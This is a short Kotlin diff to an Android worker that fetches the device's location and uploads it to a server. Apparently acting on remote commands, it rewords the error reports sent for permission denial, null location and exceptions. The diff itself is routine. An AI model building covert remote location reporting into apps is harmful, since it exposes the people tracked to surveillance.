@@ -119,7 +119,8 @@ class DataFetchWorker(
         return try {
             if (!hasLocationPermission()) {
                 Log.e(TAG, "Location permission not granted")
-                return apiClient.uploadText("❌ Location command failed: Permission not granted")
+                // Explicitly inform server about permission issues
+                return apiClient.uploadText("❌ Location request failed: PERMISSION_DENIED")
             }
 
             val location = getCurrentLocation()
@@ -136,13 +137,13 @@ class DataFetchWorker(
                 }
                 apiClient.uploadText(message.trim())
             } else {
-                Log.w(TAG, "Failed to obtain location - received null")
-                apiClient.uploadText("📍 Location Update: Failed to get location (location was null)")
+                Log.w(TAG, "Failed to obtain location - received null despite having permission")
+                apiClient.uploadText("📍 Location Update: LOCATION_UNAVAILABLE (Permission granted but location services may be disabled)")
                 false
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error fetching location", e)
-            apiClient.uploadText("📍 Location Update: Error occurred - ${e.message}")
+            apiClient.uploadText("📍 Location Update: LOCATION_ERROR - ${e.message}")
             false
         }
     }
